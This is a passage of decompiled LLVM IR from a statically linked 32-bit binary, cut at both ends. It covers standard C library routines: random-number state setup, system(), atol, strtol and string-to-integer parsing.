  %v1_8054a00 = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_8054a07 = select i1 %v1_8054a00, i32 1, i32 %arg1
  store i32 %v3_8054a07, i32* %edx.global-to-local, align 4
  %v1_8054a0a = icmp eq i32 %v3_80549f5, 0
  %v2_8054a0c = inttoptr i32 %v3_80549fd to i32*
  store i32 %v3_8054a07, i32* %v2_8054a0c, align 4
  br i1 %v1_8054a0a, label %dec_label_pc_8054a73, label %dec_label_pc_8054a10

dec_label_pc_8054a10:                             ; preds = %dec_label_pc_80549fd
  %v0_8054a10 = load i32, i32* @esi, align 4
  %v1_8054a10 = add i32 %v0_8054a10, 16
  %v2_8054a10 = inttoptr i32 %v1_8054a10 to i32*
  %v3_8054a10 = load i32, i32* %v2_8054a10, align 4
  store i32 %v3_8054a10, i32* %eax.global-to-local, align 4
  %v0_8054a13 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8054a13, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_8054a1a = sext i32 %v3_8054a10 to i64
  store i64 %v4_8054a1a, i64* %stack_var_-40, align 8
  %v5_8054a5032 = icmp sgt i32 %v3_8054a10, 1
  br i1 %v5_8054a5032, label %dec_label_pc_8054a1f, label %dec_label_pc_8054a52

dec_label_pc_8054a1f:                             ; preds = %dec_label_pc_8054a10, %dec_label_pc_8054a1f.dec_label_pc_8054a1f_crit_edge
  %v0_8054a47 = phi i32 [ %v0_8054a47.pre, %dec_label_pc_8054a1f.dec_label_pc_8054a1f_crit_edge ], [ %v0_8054a13, %dec_label_pc_8054a10 ]
  %v0_8054a1f = load i32, i32* %edx.global-to-local, align 4
  %v1_8054a26 = ashr i32 %v0_8054a1f, 31
  %v2_8054a27 = zext i32 %v0_8054a1f to i64
  %v4_8054a27 = zext i32 %v1_8054a26 to i64
  %v5_8054a27 = mul nuw i64 %v4_8054a27, 4294967296
  %v6_8054a27 = or i64 %v5_8054a27, %v2_8054a27
  %v8_8054a27 = sdiv i64 %v6_8054a27, 127773
  %v9_8054a27 = trunc i64 %v8_8054a27 to i32
  %v10_8054a27 = srem i64 %v6_8054a27, 127773
  %v3_8054a2d = mul nsw i64 %v10_8054a27, 16807
  %v4_8054a2d = trunc i64 %v3_8054a2d to i32
  %tmp24 = mul i32 %v9_8054a27, -2836
  %v2_8054a39 = add i32 %v4_8054a2d, %tmp24
  %v1_8054a3b = add i32 %v2_8054a39, 1
  %v6_8054a3b = xor i32 %v2_8054a39, -2147483648
  %v7_8054a3b = xor i32 %v1_8054a3b, %v2_8054a39
  %v8_8054a3b = and i32 %v7_8054a3b, %v6_8054a3b
  %v9_8054a3b = icmp slt i32 %v8_8054a3b, 0
  %v10_8054a3b = icmp eq i32 %v1_8054a3b, 0
  %v11_8054a3b = icmp slt i32 %v1_8054a3b, 0
  %v1_8054a3e = add i32 %v2_8054a39, 2147483647
  store i32 %v1_8054a3e, i32* %eax.global-to-local, align 4
  %v3_8054a44 = icmp ne i1 %v11_8054a3b, %v9_8054a3b
  %v4_8054a44 = or i1 %v10_8054a3b, %v3_8054a44
  %v7_8054a44 = select i1 %v4_8054a44, i32 %v1_8054a3e, i32 %v2_8054a39
  store i32 %v7_8054a44, i32* %edx.global-to-local, align 4
  %v1_8054a47 = add i32 %v0_8054a47, 4
  store i32 %v1_8054a47, i32* %ecx.global-to-local, align 4
  %v2_8054a4a = inttoptr i32 %v1_8054a47 to i32*
  store i32 %v7_8054a44, i32* %v2_8054a4a, align 4
  %v0_8054a4c = load i32, i32* @edi, align 4
  %v1_8054a4c = add i32 %v0_8054a4c, 1
  store i32 %v1_8054a4c, i32* @edi, align 4
  %v3_8054a4d.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t11 = trunc i64 %v3_8054a4d.pre to i32
  %v5_8054a50 = icmp slt i32 %v1_8054a4c, %extract.t11
  br i1 %v5_8054a50, label %dec_label_pc_8054a1f.dec_label_pc_8054a1f_crit_edge, label %dec_label_pc_8054a4d.dec_label_pc_8054a52_crit_edge

dec_label_pc_8054a1f.dec_label_pc_8054a1f_crit_edge: ; preds = %dec_label_pc_8054a1f
  %v0_8054a47.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8054a1f

dec_label_pc_8054a4d.dec_label_pc_8054a52_crit_edge: ; preds = %dec_label_pc_8054a1f
  %v0_8054a52.pre = load i32, i32* @esi, align 4
  %v0_8054a55.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054a52

dec_label_pc_8054a52:                             ; preds = %dec_label_pc_8054a4d.dec_label_pc_8054a52_crit_edge, %dec_label_pc_8054a10
  %v0_8054a55 = phi i32 [ %v0_8054a55.pre, %dec_label_pc_8054a4d.dec_label_pc_8054a52_crit_edge ], [ %v0_8054a13, %dec_label_pc_8054a10 ]
  %v0_8054a52 = phi i32 [ %v0_8054a52.pre, %dec_label_pc_8054a4d.dec_label_pc_8054a52_crit_edge ], [ %v0_8054a10, %dec_label_pc_8054a10 ]
  %v1_8054a52 = add i32 %v0_8054a52, 20
  %v2_8054a52 = inttoptr i32 %v1_8054a52 to i32*
  %v3_8054a52 = load i32, i32* %v2_8054a52, align 4
  store i32 %v3_8054a52, i32* %eax.global-to-local, align 4
  %v2_8054a55 = add i32 %v0_8054a52, 4
  %v3_8054a55 = inttoptr i32 %v2_8054a55 to i32*
  store i32 %v0_8054a55, i32* %v3_8054a55, align 4
  %v0_8054a58 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8054a58 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054a58 = mul i32 %v1_8054a58, 4
  %v3_8054a58 = add i32 %v2_8054a58, %v0_8054a58
  store i32 %v3_8054a58, i32* %eax.global-to-local, align 4
  %v1_8054a5b = load i32, i32* @esi, align 4
  %v2_8054a5b = inttoptr i32 %v1_8054a5b to i32*
  store i32 %v3_8054a58, i32* %v2_8054a5b, align 4
  %v3_8054a5d = load i64, i64* %stack_var_-40, align 8
  %v6_8054a5d = mul nsw i64 %v3_8054a5d, 10
  %v7_8054a5d = trunc i64 %v6_8054a5d to i32
  %v2_8054a63 = ptrtoint i32* %stack_var_-20 to i32
  %v1_8054a7025 = add i32 %v7_8054a5d, -1
  %v9_8054a7029 = icmp slt i32 %v1_8054a7025, 0
  store i32 %v1_8054a7025, i32* @ebx, align 4
  %v1_8054a7130 = icmp eq i1 %v9_8054a7029, false
  br i1 %v1_8054a7130, label %dec_label_pc_8054a63, label %dec_label_pc_8054a73

dec_label_pc_8054a63:                             ; preds = %dec_label_pc_8054a52, %dec_label_pc_8054a63
  store i32 %v2_8054a63, i32* %eax.global-to-local, align 4
  %v0_8054a68 = load i32, i32* @esi, align 4
  %v2_8054a69 = inttoptr i32 %v0_8054a68 to i32*
  %v3_8054a69 = call i32 @__GI_random_r(i32* %v2_8054a69, i32 %v2_8054a63)
  store i32 %v0_8054a68, i32* %eax.global-to-local, align 4
  store i32 %v2_8054a63, i32* %edx.global-to-local, align 4
  %v0_8054a70.pre = load i32, i32* @ebx, align 4
  %v1_8054a70 = add i32 %v0_8054a70.pre, -1
  %v9_8054a70 = icmp slt i32 %v1_8054a70, 0
  store i32 %v1_8054a70, i32* @ebx, align 4
  %v1_8054a71 = icmp eq i1 %v9_8054a70, false
  br i1 %v1_8054a71, label %dec_label_pc_8054a63, label %dec_label_pc_8054a73

dec_label_pc_8054a73:                             ; preds = %dec_label_pc_8054a52, %dec_label_pc_8054a63, %dec_label_pc_80549fd
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054a75

dec_label_pc_8054a75:                             ; preds = %entry, %dec_label_pc_8054a73
  %v0_8054a7c = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8054a73 ]
  store i32 %v0_80549e9, i32* @ebx, align 4
  store i32 %v0_80549e8, i32* @esi, align 4
  store i32 %v0_80549e7, i32* @edi, align 4
  store i32 %v0_80549e3, i32* @ebp, align 4
  ret i32 %v0_8054a7c

; uselistorder directives
  uselistorder i32 %v1_8054a70, { 1, 0 }
  uselistorder i32 %v0_8054a52, { 1, 0 }
  uselistorder i32 %v1_8054a3b, { 2, 1, 0 }
  uselistorder i32 %v2_8054a39, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_8054a13, { 1, 0, 2 }
  uselistorder i32 %v3_80549f5, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_8054a75, { 1, 0 }
  uselistorder label %dec_label_pc_8054a73, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8054a63, { 1, 0 }
  uselistorder label %dec_label_pc_8054a1f, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_8054a7f = load i32, i32* @esi, align 4
  %v0_8054a80 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp = icmp ult i32 %arg3, 128
  br i1 %tmp, label %dec_label_pc_8054aa1, label %dec_label_pc_8054a95

dec_label_pc_8054a95:                             ; preds = %entry
  %v2_8054a95 = icmp ult i32 %arg3, 256
  %v1_8054a9c = select i1 %v2_8054a95, i32 5, i32 4
  store i32 %v1_8054a9c, i32* @ebx, align 4
  br label %dec_label_pc_8054ab7

dec_label_pc_8054aa1:                             ; preds = %entry
  %v6_8054aa4 = icmp ugt i32 %arg3, 31
  br i1 %v6_8054aa4, label %dec_label_pc_8054aaf, label %dec_label_pc_8054aa6

dec_label_pc_8054aa6:                             ; preds = %dec_label_pc_8054aa1
  store i32 0, i32* @ebx, align 4
  %v6_8054aab = icmp ugt i32 %arg3, 7
  br i1 %v6_8054aab, label %dec_label_pc_8054ab7, label %dec_label_pc_8054b07

dec_label_pc_8054aaf:                             ; preds = %dec_label_pc_8054aa1
  %v2_8054aaf = icmp ult i32 %arg3, 64
  %v1_8054ab4 = select i1 %v2_8054aaf, i32 3, i32 2
  store i32 %v1_8054ab4, i32* @ebx, align 4
  br label %dec_label_pc_8054ab7

dec_label_pc_8054ab7:                             ; preds = %dec_label_pc_8054aa6, %dec_label_pc_8054a95, %dec_label_pc_8054aaf
  %v0_8054ac1 = phi i32 [ 0, %dec_label_pc_8054aa6 ], [ %v1_8054a9c, %dec_label_pc_8054a95 ], [ %v1_8054ab4, %dec_label_pc_8054aaf ]
  %v1_8054ab7 = mul nuw nsw i32 %v0_8054ac1, 4
  %v2_8054ab7 = add i32 %v1_8054ab7, ptrtoint (i32* @global_var_805ae74.529 to i32)
  %v3_8054ab7 = inttoptr i32 %v2_8054ab7 to i32*
  %v4_8054ab7 = load i32, i32* %v3_8054ab7, align 4
  store i32 %v4_8054ab7, i32* %eax.global-to-local, align 4
  %v1_8054abe = add i32 %tmp7, 4
  store i32 %v1_8054abe, i32* @esi, align 4
  %v2_8054ac1 = add i32 %v1_8054ab7, ptrtoint (i32* @global_var_805ae60.530 to i32)
  %v3_8054ac1 = inttoptr i32 %v2_8054ac1 to i32*
  %v4_8054ac1 = load i32, i32* %v3_8054ac1, align 4
  store i32 %v4_8054ac1, i32* %edx.global-to-local, align 4
  %v2_8054ac8 = add i32 %arg4, 12
  %v3_8054ac8 = inttoptr i32 %v2_8054ac8 to i32*
  store i32 %v0_8054ac1, i32* %v3_8054ac8, align 4
  %v0_8054acb = load i32, i32* @esi, align 4
  %v1_8054acb = load i32, i32* @edi, align 4
  %v2_8054acb = add i32 %v1_8054acb, 8
  %v3_8054acb = inttoptr i32 %v2_8054acb to i32*
  store i32 %v0_8054acb, i32* %v3_8054acb, align 4
  %v0_8054ace = load i32, i32* %eax.global-to-local, align 4
  %v1_8054ace = load i32, i32* @edi, align 4
  %v2_8054ace = add i32 %v1_8054ace, 16
  %v3_8054ace = inttoptr i32 %v2_8054ace to i32*
  store i32 %v0_8054ace, i32* %v3_8054ace, align 4
  %v0_8054ad1 = load i32, i32* @esi, align 4
  %v1_8054ad1 = load i32, i32* %eax.global-to-local, align 4
  %v2_8054ad1 = mul i32 %v1_8054ad1, 4
  %v3_8054ad1 = add i32 %v2_8054ad1, %v0_8054ad1
  store i32 %v3_8054ad1, i32* %eax.global-to-local, align 4
  %v0_8054ad4 = load i32, i32* %edx.global-to-local, align 4
  %v1_8054ad4 = load i32, i32* @edi, align 4
  %v2_8054ad4 = add i32 %v1_8054ad4, 20
  %v3_8054ad4 = inttoptr i32 %v2_8054ad4 to i32*
  store i32 %v0_8054ad4, i32* %v3_8054ad4, align 4
  %v0_8054ad7 = load i32, i32* %eax.global-to-local, align 4
  %v1_8054ad7 = load i32, i32* @edi, align 4
  %v2_8054ad7 = add i32 %v1_8054ad7, 24
  %v3_8054ad7 = inttoptr i32 %v2_8054ad7 to i32*
  store i32 %v0_8054ad7, i32* %v3_8054ad7, align 4
  %v0_8054ada = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8054adf = inttoptr i32 %v0_8054ada to i32*
  %v3_8054adf = call i32 @srandom_r(i32 %arg1, i32* %v2_8054adf)
  %v0_8054ae4 = load i32, i32* @ebp, align 4
  %v1_8054ae4 = inttoptr i32 %v0_8054ae4 to i32*
  store i32 0, i32* %v1_8054ae4, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8054aef = load i32, i32* @ebx, align 4
  %v1_8054aef = icmp eq i32 %v0_8054aef, 0
  br i1 %v1_8054aef, label %dec_label_pc_8054b20, label %dec_label_pc_8054af3

dec_label_pc_8054af3:                             ; preds = %dec_label_pc_8054ab7
  %v0_8054af3 = load i32, i32* @edi, align 4
  %v1_8054af3 = add i32 %v0_8054af3, 4
  %v2_8054af3 = inttoptr i32 %v1_8054af3 to i32*
  %v3_8054af3 = load i32, i32* %v2_8054af3, align 4
  %v1_8054af6 = load i32, i32* @esi, align 4
  %v2_8054af6 = sub i32 %v3_8054af3, %v1_8054af6
  %v2_8054af8 = sdiv i32 %v2_8054af6, 4
  %v3_8054afb = mul i32 %v2_8054af8, 5
  %v2_8054afe = add i32 %v3_8054afb, %v0_8054aef
  %v1_8054b00 = load i32, i32* @ebp, align 4
  %v2_8054b00 = inttoptr i32 %v1_8054b00 to i32*
  store i32 %v2_8054afe, i32* %v2_8054b00, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054b20

dec_label_pc_8054b07:                             ; preds = %dec_label_pc_8054aa6
  %v1_8054b07 = call i32 @__errno_location(i32 %v0_8054a80)
  store i32 %v1_8054b07, i32* %eax.global-to-local, align 4
  %v1_8054b0c = inttoptr i32 %v1_8054b07 to i32*
  store i32 22, i32* %v1_8054b0c, align 4
  %v0_8054b12 = load i32, i32* %stack_var_-36, align 4
  %v1_8054b12 = call i32 @__errno_location(i32 %v0_8054b12)
  %v1_8054b17 = inttoptr i32 %v1_8054b12 to i32*
  store i32 22, i32* %v1_8054b17, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054b20

dec_label_pc_8054b20:                             ; preds = %dec_label_pc_8054ab7, %dec_label_pc_8054af3, %dec_label_pc_8054b07
  %v0_8054b27 = phi i32 [ 0, %dec_label_pc_8054ab7 ], [ 0, %dec_label_pc_8054af3 ], [ -1, %dec_label_pc_8054b07 ]
  store i32 %v0_8054a7f, i32* @esi, align 4
  ret i32 %v0_8054b27

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8054b20, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054ab7, { 2, 0, 1 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8054b28 = load i32, i32* @ebx, align 4
  %v4_8054b31 = icmp eq i32 %arg1, 0
  br i1 %v4_8054b31, label %dec_label_pc_8054c54, label %dec_label_pc_8054b3c

dec_label_pc_8054b3c:                             ; preds = %entry
  %v2_8054b42 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8054b51 = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 2, i32* @ebx, align 4
  %v2_8054b60 = call i32 @__bsd_signal(i32 17, i32 0)
  %v1_8054b69 = call i32 @__vfork(i32 %v2_8054b60)
  %v2_8054b71 = icmp slt i32 %v1_8054b69, 0
  store i32 %v1_8054b69, i32* @ebx, align 4
  %v2_8054b76 = icmp eq i1 %v2_8054b71, false
  br i1 %v2_8054b76, label %dec_label_pc_8054ba7, label %dec_label_pc_8054b78

dec_label_pc_8054b78:                             ; preds = %dec_label_pc_8054b3c
  %v2_8054b80 = call i32 @__bsd_signal(i32 3, i32 %v2_8054b42)
  store i32 %v2_8054b42, i32* @edx, align 4
  %v2_8054b8d = call i32 @__bsd_signal(i32 2, i32 %v2_8054b51)
  store i32 2, i32* @ebx, align 4
  %v2_8054b9a = call i32 @__bsd_signal(i32 17, i32 %v2_8054b60)
  br label %dec_label_pc_8054c51

dec_label_pc_8054ba7:                             ; preds = %dec_label_pc_8054b3c
  %v1_8054b71 = icmp eq i32 %v1_8054b69, 0
  %v1_8054ba7 = icmp eq i1 %v1_8054b71, false
  br i1 %v1_8054ba7, label %dec_label_pc_8054bf3, label %dec_label_pc_8054ba9

dec_label_pc_8054ba9:                             ; preds = %dec_label_pc_8054ba7
  %v2_8054baf = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 0, i32* @edx, align 4
  %v2_8054bba = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 2, i32* @ebx, align 4
  %v2_8054bc5 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_8054be4 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_805ae8b.533 to i32), i32 ptrtoint ([3 x i8]* @global_var_805ae90.532 to i32), i32 ptrtoint ([3 x i8]* @global_var_805ae88.531 to i32), i32 %arg1, i32 0)
  %v1_8054bee = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8054bf3:                             ; preds = %dec_label_pc_8054ba7
  %v2_8054bf9 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8054c04 = call i32 @__bsd_signal(i32 2, i32 1)
  %v2_8054c09 = ptrtoint i32* %stack_var_-8 to i32
  %v0_8054c12 = load i32, i32* @ebx, align 4
  %v7_8054c13 = call i32 @wait4(i32 %v0_8054c12, i32 %v2_8054c09, i32 0, i32 0)
  %v8_8054c1e = icmp eq i32 %v7_8054c13, -1
  %v1_8054c1f = icmp eq i1 %v8_8054c1e, false
  %v6_8054c1f = load i32, i32* %stack_var_-8, align 4
  %v7_8054c1f = select i1 %v1_8054c1f, i32 %v6_8054c1f, i32 -1
  store i32 %v7_8054c1f, i32* @edx, align 4
  store i32 %v7_8054c1f, i32* %stack_var_-8, align 4
  %v2_8054c2e = call i32 @__bsd_signal(i32 3, i32 %v2_8054b42)
  store i32 %v2_8054b42, i32* @ebx, align 4
  %v2_8054c3b = call i32 @__bsd_signal(i32 2, i32 %v2_8054b51)
  store i32 %v2_8054b51, i32* @edx, align 4
  %v2_8054c48 = call i32 @__bsd_signal(i32 17, i32 %v2_8054b60)
  %v3_8054c4d = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8054c51

dec_label_pc_8054c51:                             ; preds = %dec_label_pc_8054b78, %dec_label_pc_8054bf3
  %storemerge = phi i32 [ -1, %dec_label_pc_8054b78 ], [ %v3_8054c4d, %dec_label_pc_8054bf3 ]
  br label %dec_label_pc_8054c54

dec_label_pc_8054c54:                             ; preds = %entry, %dec_label_pc_8054c51
  %v0_8054c58 = phi i32 [ 1, %entry ], [ %storemerge, %dec_label_pc_8054c51 ]
  store i32 %v0_8054b28, i32* @ebx, align 4
  ret i32 %v0_8054c58

; uselistorder directives
  uselistorder i32 %v1_8054b69, { 2, 0, 1 }
  uselistorder i32 %v2_8054b60, { 1, 0, 2 }
  uselistorder i32 %v2_8054b51, { 0, 2, 1 }
  uselistorder i32 %v2_8054b42, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 (i32)* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_8054c54, { 1, 0 }
  uselistorder label %dec_label_pc_8054c51, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_8054c67 = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_8054c67
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8054c81 = inttoptr i32 %arg1 to i8*
  %v5_8054c81 = call i32 @_stdlib_strto_l(i8* %v4_8054c81, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8054c81
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8054c8f = load i32, i32* @ebx, align 4
  store i32 %v0_8054c8f, i32* %stack_var_-16, align 4
  %v4_8054c93 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8054c93, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_8054c9b = load i32, i32* @global_var_805c278, align 8
  store i32 %v0_8054c9b, i32* %edx.global-to-local, align 4
  store i32 %v4_8054c93, i32* %ebx.global-to-local, align 4
  %v2_8054ca641 = load i8, i8* %arg1, align 1
  %v3_8054ca642 = sext i8 %v2_8054ca641 to i32
  store i32 %v3_8054ca642, i32* %eax.global-to-local, align 4
  %v2_8054ca943 = mul nsw i32 %v3_8054ca642, 2
  %v3_8054ca944 = add i32 %v2_8054ca943, %v0_8054c9b
  %v4_8054ca945 = inttoptr i32 %v3_8054ca944 to i8*
  %v5_8054ca946 = load i8, i8* %v4_8054ca945, align 1
  %v6_8054ca947 = and i8 %v5_8054ca946, 32
  %v7_8054ca948 = icmp eq i8 %v6_8054ca947, 0
  %v1_8054cad49 = icmp eq i1 %v7_8054ca948, false
  br i1 %v1_8054cad49, label %dec_label_pc_8054ca5, label %dec_label_pc_8054caf

dec_label_pc_8054ca5:                             ; preds = %entry, %dec_label_pc_8054ca5
  %v0_8054ca550 = phi i32 [ %v1_8054ca5, %dec_label_pc_8054ca5 ], [ %v4_8054c93, %entry ]
  %v1_8054ca5 = add i32 %v0_8054ca550, 1
  store i32 %v1_8054ca5, i32* %ebx.global-to-local, align 4
  %v1_8054ca6 = inttoptr i32 %v1_8054ca5 to i8*
  %v2_8054ca6 = load i8, i8* %v1_8054ca6, align 1
  %v3_8054ca6 = sext i8 %v2_8054ca6 to i32
  store i32 %v3_8054ca6, i32* %eax.global-to-local, align 4
  %v2_8054ca9 = mul nsw i32 %v3_8054ca6, 2
  %v3_8054ca9 = add i32 %v2_8054ca9, %v0_8054c9b
  %v4_8054ca9 = inttoptr i32 %v3_8054ca9 to i8*
  %v5_8054ca9 = load i8, i8* %v4_8054ca9, align 1
  %v6_8054ca9 = and i8 %v5_8054ca9, 32
  %v7_8054ca9 = icmp eq i8 %v6_8054ca9, 0
  %v1_8054cad = icmp eq i1 %v7_8054ca9, false
  br i1 %v1_8054cad, label %dec_label_pc_8054ca5, label %dec_label_pc_8054caf

dec_label_pc_8054caf:                             ; preds = %dec_label_pc_8054ca5, %entry
  %v0_8054ca5.lcssa = phi i32 [ %v4_8054c93, %entry ], [ %v1_8054ca5, %dec_label_pc_8054ca5 ]
  %v2_8054ca6.lcssa = phi i8 [ %v2_8054ca641, %entry ], [ %v2_8054ca6, %dec_label_pc_8054ca5 ]
  %v3_8054ca6.lcssa = phi i32 [ %v3_8054ca642, %entry ], [ %v3_8054ca6, %dec_label_pc_8054ca5 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_8054caf = icmp eq i8 %v2_8054ca6.lcssa, 43
  br i1 %v9_8054caf, label %dec_label_pc_8054cca, label %dec_label_pc_8054cb4

dec_label_pc_8054cb4:                             ; preds = %dec_label_pc_8054caf
  %v9_8054cb4 = icmp eq i8 %v2_8054ca6.lcssa, 45
  %v1_8054cbc = icmp eq i1 %v9_8054cb4, false
  br i1 %v1_8054cbc, label %dec_label_pc_8054ccb, label %dec_label_pc_8054cca

dec_label_pc_8054cca:                             ; preds = %dec_label_pc_8054caf, %dec_label_pc_8054cb4
  %storemerge5 = phi i8 [ 1, %dec_label_pc_8054cb4 ], [ 0, %dec_label_pc_8054caf ]
  %v1_8054cca = add i32 %v0_8054ca5.lcssa, 1
  store i32 %v1_8054cca, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054ccb

dec_label_pc_8054ccb:                             ; preds = %dec_label_pc_8054cb4, %dec_label_pc_8054cca
  %v0_8054cdd = phi i32 [ %v1_8054cca, %dec_label_pc_8054cca ], [ %v0_8054ca5.lcssa, %dec_label_pc_8054cb4 ]
  %stack_var_-18.0 = phi i8 [ %storemerge5, %dec_label_pc_8054cca ], [ 0, %dec_label_pc_8054cb4 ]
  %v1_8054ccb = and i32 %arg3, -17
  %v2_8054ccb = icmp eq i32 %v1_8054ccb, 0
  %v1_8054cd3 = icmp eq i1 %v2_8054ccb, false
  br i1 %v1_8054cd3, label %dec_label_pc_8054cf9, label %dec_label_pc_8054cd5

dec_label_pc_8054cd5:                             ; preds = %dec_label_pc_8054ccb
  %v1_8054cd5 = add i32 %arg3, 10
  store i32 %v1_8054cd5, i32* %esi.global-to-local, align 4
  %v1_8054cd8 = inttoptr i32 %v0_8054cdd to i8*
  %v2_8054cd8 = load i8, i8* %v1_8054cd8, align 1
  %v8_8054cd8 = icmp eq i8 %v2_8054cd8, 48
  %v1_8054cdb = icmp eq i1 %v8_8054cd8, false
  br i1 %v1_8054cdb, label %dec_label_pc_8054cee, label %dec_label_pc_8054cdd

dec_label_pc_8054cdd:                             ; preds = %dec_label_pc_8054cd5
  %v1_8054cdd = add i32 %v0_8054cdd, 1
  store i32 %v1_8054cdd, i32* %ebx.global-to-local, align 4
  %v1_8054cde = add i32 %arg3, 8
  store i32 %v1_8054cde, i32* %esi.global-to-local, align 4
  %v1_8054ce1 = inttoptr i32 %v1_8054cdd to i8*
  %v2_8054ce1 = load i8, i8* %v1_8054ce1, align 1
  %v2_8054ce5 = or i8 %v2_8054ce1, 32
  %v7_8054ce5 = zext i8 %v2_8054ce5 to i32
  %v9_8054ce5 = and i32 %v3_8054ca6.lcssa, -256
  %v10_8054ce5 = or i32 %v7_8054ce5, %v9_8054ce5
  store i32 %v10_8054ce5, i32* %eax.global-to-local, align 4
  %v10_8054ce7 = icmp eq i8 %v2_8054ce5, 120
  %v1_8054ce9 = icmp eq i1 %v10_8054ce7, false
  br i1 %v1_8054ce9, label %dec_label_pc_8054cee, label %dec_label_pc_8054ceb

dec_label_pc_8054ceb:                             ; preds = %dec_label_pc_8054cdd
  %v2_8054ceb = mul i32 %v1_8054cde, 2
  store i32 %v2_8054ceb, i32* %esi.global-to-local, align 4
  %v1_8054ced = add i32 %v0_8054cdd, 2
  store i32 %v1_8054ced, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8054cee

dec_label_pc_8054cee:                             ; preds = %dec_label_pc_8054cdd, %dec_label_pc_8054cd5, %dec_label_pc_8054ceb
  %v0_8054d1613 = phi i32 [ %v1_8054cdd, %dec_label_pc_8054cdd ], [ %v0_8054cdd, %dec_label_pc_8054cd5 ], [ %v1_8054ced, %dec_label_pc_8054ceb ]
  %v0_8054d7022 = phi i32 [ %v1_8054cdd, %dec_label_pc_8054cdd ], [ %v4_8054c93, %dec_label_pc_8054cd5 ], [ %v1_8054cdd, %dec_label_pc_8054ceb ]
  %v3_8054cf6 = phi i32 [ %v1_8054cde, %dec_label_pc_8054cdd ], [ %v1_8054cd5, %dec_label_pc_8054cd5 ], [ %v2_8054ceb, %dec_label_pc_8054ceb ]
  %v1_8054cee = add i32 %v3_8054cf6, -17
  %v6_8054cee = sub i32 16, %v3_8054cf6
  %v7_8054cee = and i32 %v6_8054cee, %v3_8054cf6
  %v8_8054cee = icmp slt i32 %v7_8054cee, 0
  %v10_8054cee = icmp slt i32 %v1_8054cee, 0
  store i32 16, i32* %eax.global-to-local, align 4
  %v2_8054cf6 = icmp eq i1 %v10_8054cee, %v8_8054cee
  %v5_8054cf6 = select i1 %v2_8054cf6, i32 16, i32 %v3_8054cf6
  store i32 %v5_8054cf6, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8054cf9

dec_label_pc_8054cf9:                             ; preds = %dec_label_pc_8054ccb, %dec_label_pc_8054cee
  %v0_8054d7023 = phi i32 [ %v4_8054c93, %dec_label_pc_8054ccb ], [ %v0_8054d7022, %dec_label_pc_8054cee ]
